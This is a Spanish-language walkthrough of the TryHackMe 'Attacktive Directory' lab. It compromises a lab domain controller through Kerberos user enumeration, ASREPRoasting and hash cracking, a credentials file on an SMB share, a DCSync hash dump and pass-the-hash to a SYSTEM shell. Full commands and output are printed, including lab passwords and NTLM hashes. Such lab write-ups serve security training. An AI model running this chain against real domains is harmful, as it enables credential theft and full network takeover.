
# Attracktive Directory

{% embed url="<https://tryhackme.com/room/attacktivedirectory>" %}

## <mark style="color:purple;">Setup</mark>

```
Target: 10.10.26.240
```

Para esta máquina es necesario tener Bloodhound instalado, puedes consultar el proceso de instalación en la siguiente sección:

{% content-ref url="/pages/TEIs7wP6Kqu4uwenlqgM" %}
[BloodHound](/ethical-hacking-cheatsheet/active-directory/active-directory/bloodhound.md)
{% endcontent-ref %}

## <mark style="color:purple;">Enumeración</mark>

### Escaneo de puertos

```bash
sudo nmap -v -sV -sCV -T5 10.10.26.240
```

```bash
Nmap scan report for 10.10.26.240
Host is up (0.038s latency).
Not shown: 902 closed tcp ports (reset), 84 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-26 17:55:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-26T17:55:46+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-25T17:52:24
| Not valid after:  2025-09-24T17:52:24
| MD5:   1ed5:d662:02ab:4b75:fb03:8a67:4792:a10b
|_SHA-1: ffa5:3601:5900:44b7:c439:c5b2:c1ba:fece:4f0a:12b8
|_ssl-date: 2025-03-26T17:55:55+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

La presencia del **Global Catalog (3268)** y **LDAP** + **Kerberos** indica 100% que este host es un **Domain Controller**. Destacamos los puertos:

* `445 - SMB`
* `3268 - LDAP`
* `3389 - RDP`
* `5985 - WinRM`

También encontramos el nombre del dominio, que añadiremos a nuestro /ect/hosts junto con la IP:

```bash
sudo echo "10.10.26.240 spookysec.local" | sudo tee -a /etc/hosts
```

Por el puerto 80 solamente tenemos el típico inicio de un Windows Server sin nada interesante:

<figure><img src="/files/mvAngf5EocDMGdDhg9Fh" alt=""><figcaption></figcaption></figure>

### Enumeración de usuarios via Kerberos

&#x20;Vamos a usar kerbrute. Podemos instalarlo en Kali Linux con:

```bash
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

Para esta máquina, TryHackMe nos proporciona una lista de [Usuarios](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) y una de [Contraseñas ](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt)que usaremos para ataques de fuerza bruta / enumeración.

```bash
kerbrute userenum -d spookysec.local --dc 10.10.26.240 userlist.txt
```

<figure><img src="/files/OInRCWrtAGgCUTxTh72d" alt=""><figcaption></figcaption></figure>

De los usuarios que encontramos destacamos:

* `svc-admin` - Posible administrador de servicios
* `administrator` - Posible Domain Admin
* `backup` - Usuario interesante

Nos guardamos estos usuarios en una lista `valid-users.txt` que usaremos para otros ataques:

{% code title="valid-users.txt" %}

```
james
svc-admin
svc-admin
robin
darkstar
administrator
backup
paradox
ori
```

{% endcode %}

## <mark style="color:purple;">Abuso de Kerberos</mark>

Una vez finalizada la enumeración de cuentas de usuario, podemos intentar abusar de una característica dentro de Kerberos con un método de ataque llamado **ASREPRoasting.**

**El ASREPRoasting ocurre cuando una cuenta de usuario tiene el privilegio "**`Does not require Pre-Authentication`**"** . Esto significa que la cuenta **no** necesita proporcionar una identificación válida antes de solicitar un ticket Kerberos para la cuenta de usuario especificada.

### **Recuperación de tickets Kerberos** <a href="#id-10e5" id="id-10e5"></a>

[Impacket](https://github.com/SecureAuthCorp/impacket) cuenta con una herramienta llamada " **`GetNPUsers.py`** " que nos permite **consultar cuentas `ASReproastables`** desde el Key Distribution Center (KDC). Lo único necesario para consultar cuentas es un **conjunto válido de nombres de usuario** , que enumeramos previamente mediante Kerbrute.

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ impacket-GetNPUsers spookysec.local/ -usersfile valid-users.txt -dc-ip 10.10.26.240

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:42db3ad24ab2c4c34b2babd3c834a164$35d839b45ecbf6834017a6a240d0cd009bc3ca67c7f4bf961be3f7cb36401debf03e4aea6b79541077335707178a103d1c977d56daeb378652bb9a000c9fc6d34a3785fa0bde03d4c81f74da3e430623ba3b6e2d28b15228d231f1e1f6413660e8095c1bcec1b8ff13bcf38b026137ae6faf51dcb3f80905b8888d168fd156fff0c4a1374d91082f4e59987c981197aeabbb048cbcb5f60cf973a6534346519cf7df42a37ea679e5b3d4b80e06455765e73ef2cd31e87af46da9d58655d8178eaffdc7af8ec7113a32131260aedd9f0fb3f78cf6e720bfae189dffea66c480e5c7ed5e2ca37cc2da88ec1cafb5afd8550266
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
```

{% endcode %}

Obtenemos el hash del usuario `svc-admin`, que guardaremos en un archivo `hash.txt` para crackearlo con hashcat y el modo 18200 (Kerberos):

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 18200 hash.txt passwordlist.txt

<----SNIP---->
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:42db3ad24ab2c4c34b2babd3c834a164$35d839b45ecbf6834017a6a240d0cd009bc3ca67c7f4bf961be3f7cb36401debf03e4aea6b79541077335707178a103d1c977d56daeb378652bb9a000c9fc6d34a3785fa0bde03d4c81f74da3e430623ba3b6e2d28b15228d231f1e1f6413660e8095c1bcec1b8ff13bcf38b026137ae6faf51dcb3f80905b8888d168fd156fff0c4a1374d91082f4e59987c981197aeabbb048cbcb5f60cf973a6534346519cf7df42a37ea679e5b3d4b80e06455765e73ef2cd31e87af46da9d58655d8178eaffdc7af8ec7113a32131260aedd9f0fb3f78cf6e720bfae189dffea66c480e5c7ed5e2ca37cc2da88ec1cafb5afd8550266:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:42db3ad24ab...550266
Time.Started.....: Wed Mar 26 19:48:35 2025 (0 secs)
Time.Estimated...: Wed Mar 26 19:48:35 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1702.7 kH/s (1.07ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/70188 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: m123456 -> whitey
Hardware.Mon.#1..: Util:  7%
```

{% endcode %}

Encontramos la contraseña en plano del usuario `svc-admin`!

## <mark style="color:purple;">Enumeración</mark>

Con las credenciales de esta cuenta de usuario, ahora tenemos mucho más acceso al dominio. Podemos intentar enumerar los recursos compartidos que el controlador de dominio pueda estar asignando.

Con `smbclient -L` podemos enumerar SMB Shares de una forma muy sencilla:

```shell-session
afsh4ck@kali$ smbclient -L 10.10.26.240 -U spookysec.local/svc-admin%management2005                      

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

También podemos usar SMBMap para obtener algo más de información:

```bash
smbmap -u svc-admin -p management2005 -H 10.10.26.240
```

<figure><img src="/files/ExfVPmcf9M3gazglWvZY" alt=""><figcaption></figcaption></figure>

Encontramos los siguiente recursos compartidos:

<table data-header-hidden><thead><tr><th width="190"></th><th width="165"></th><th></th></tr></thead><tbody><tr><td><strong>Recurso Compartido</strong></td><td><strong>Permisos</strong></td><td><strong>Descripción</strong></td></tr><tr><td>ADMIN$</td><td>NO ACCESS</td><td>Administración remota</td></tr><tr><td>backup</td><td>READ ONLY</td><td>Posible acceso a archivos de respaldo</td></tr><tr><td>C$</td><td>NO ACCESS</td><td>Share predeterminado</td></tr><tr><td>IPC$</td><td>READ ONLY</td><td>Canal de comunicación remota</td></tr><tr><td>NETLOGON</td><td>READ ONLY</td><td>Archivos del servidor de inicio de sesión</td></tr><tr><td>SYSVOL</td><td>READ ONLY</td><td>Políticas y scripts de dominio</td></tr></tbody></table>

Nos interesa sobre todo el de `backup`, que puede contener archivos interesantes que contengan credenciales:

```shell-session
afsh4ck@kali$ smbclient -U svc-admin //10.10.26.240/backup

Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

		8247551 blocks of size 4096. 3604534 blocks available
		
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
```

Nos descargamos el archivo `backup_credentials.txt`. Vamos a echarle un ojo:

```shell-session
afsh4ck@kali$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Parece que el contenido está codificado en base64, vamos a decodificarlo:

```shell-session
afsh4ck@kali$ base64 -d backup_credentials.txt 
backup@spookysec.local:backup2517860
```

Obtenemos las credenciales del usuario `backup`!

## <mark style="color:purple;">Acceso por RDP</mark>

Vamos a acceder por RDP como el usuario `svc-admin` y a crear un recurso compartido en red para compartirnos herramientas fácilmente:

```bash
xfreerdp /v:10.10.26.240 /u:svc-admin /p:management2005 /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

Al acceder en el escritorio nos encontramos el user flag:

<figure><img src="/files/ARBogkyUPPgtWFqlSgJR" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Bloodhound</mark>

Vamos a analizar el objetivo con Bloodhound para extraer más información sobre el dominio. Para ello podemos:

* Importar el archivo [`SharpHound.exe`](https://github.com/SpecterOps/SharpHound) a la máquina Windows, ejecutarlo y enviar a Kali de vuelta el zip que genera.
* Ejecutar `bloodhound-python` desde Kali Linux con credenciales en el dominio.

Para evitar tener que enviar el archivo a la máquina Windows, y enviarlo de vuelta a Kali para analizarlo, utilizaremos `bloodhound-python`.

Para ello debemos primera configurar el archivo `/etc/resolv.conf` de la siguiente manera:

```
domain spookysec.local
nameserver 10.10.26.240
search spookysec.local
```

Ahora ya podemos ejecutar `bloodhound-python` de la siguiente manera. Usaremos las credenciales del usuario backup:

```shell-session
afsh4ck@kali$ bloodhound-python -d spookysec.local -u backup -p backup2517860 -dc AttacktiveDirectory.spookysec.local -c All --dns-tcp --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: spookysec.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: AttacktiveDirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: AttacktiveDirectory.spookysec.local
INFO: Found 18 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 21 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Done in 00M 12S
INFO: Compressing output into 20250326202635_bloodhound.zip
```

Esto nos genera el zip que debemos importar en BloodHound. Para ello vamos a instalarlo siguiendo los pasos de la siguiente sección:

{% content-ref url="/pages/TEIs7wP6Kqu4uwenlqgM" %}
[BloodHound](/ethical-hacking-cheatsheet/active-directory/active-directory/bloodhound.md)
{% endcontent-ref %}

### Domain Admins

Vemos que hay solo 2 usuarios Domain Admins: `a-spooks` y `administrator`:

<figure><img src="/files/Rh3VEQExooDIR7F2T8yw" alt=""><figcaption></figcaption></figure>

### Enumeración de usuarios del sistema

Encontramos 4 cuentas interesantes en el grupo Domain Users:

<figure><img src="/files/RmDywzlCvY8lEbaMBjJ4" alt=""><figcaption></figcaption></figure>

* `A-SPOOKS` - Domain Admin
* `ADMINISTRATOR` - Domain Admin
* `SVC-ADMIN` - Administrador
* `BACKUP` - Usuario interesante (tenemos credenciales)

### DCSync Right

La manera más simple de encontrar la ruta a un ataque DCSync es buscar por el nombre de dominio permisos `GenericAll` o `DCSync` de algún usuario o grupo:

<figure><img src="/files/0sL39JRTUSxiApygz4LX" alt=""><figcaption></figcaption></figure>

Observamos que el usuario backup tiene permisos `GenericAll` sobre el DC, lo que significa que podemos realizar el ataque [DcSync](/ethical-hacking-cheatsheet/active-directory/active-directory/dcsync.md) con este usuario para extraer todos los hashes de los usuarios del dominio. Esto nos serviría para extraer el hash del usuario administrator y conectarnos para obtener la flag.

<figure><img src="/files/pHMggZwYfPqiTt3aUXFF" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escalada de privilegios</mark>

Es la hora de intentar hacernos con el control total del dominio AD. Vamos a utilizar Impacket  `secretsdump` con el usuario backup para realizar la extracción de todos los hashes.

### Ataque DcSync

```shell-session
afsh4ck@kali$ impacket-secretsdump -just-dc backup:"backup2517860"@10.10.26.240

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
<----SNIP---->
```

Tenemos el hash del usuario administrator! Y el de todos los usuarios del dominio. Vamos a conectarnos por RDP haciendo un `Pass the Hash`.

### Pass the Hash

```bash
xfreerdp /v:10.10.26.240 /u:administrator /pth:0e0363213e37b94221497260b0bcb4fc /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

Al conectarnos nos da el mítico error de seguridad que no nos permite conectarnos por RDP haciendo un Pass the Hash:

<figure><img src="/files/0bK54bgXEedzqd6hjfE0" alt=""><figcaption></figcaption></figure>

Para bypassearlo vamos a usar `impacket-psexec` para hacer el Pass the Hash y conseguir una shell como SYSTEM:

```shell-session
afsh4ck@kali$ impacket-psexec -hashes :0e0363213e37b94221497260b0bcb4fc administrator@10.10.26.240 cmd
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.26.240.....
[*] Found writable share ADMIN$
[*] Uploading file hdDwCtRX.exe
[*] Opening SVCManager on 10.10.26.240.....
[*] Creating service VJXX on 10.10.26.240.....
[*] Starting service VJXX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

También podríamos usar EvilWinRM para hacer el pass the hash y obtener una shell, pero solamente obtendríamos una shell como `Administrator`, no como SYSTEM, por lo que preferiblemente debemos usar `Impacket-Psexec`:

```shell-session
afsh4ck@kali$ evil-winrm -i 10.10.26.240 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

### Acceso a la flag

```powershell
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is EEA6-70E8

 Directory of C:\Users\Administrator\Desktop

04/04/2020  11:39 AM    <DIR>          .
04/04/2020  11:39 AM    <DIR>          ..
04/04/2020  11:39 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  14,630,461,440 bytes free

c:\Users\Administrator\Desktop> type root.txt
TryHackMe{4ctive***************}
```
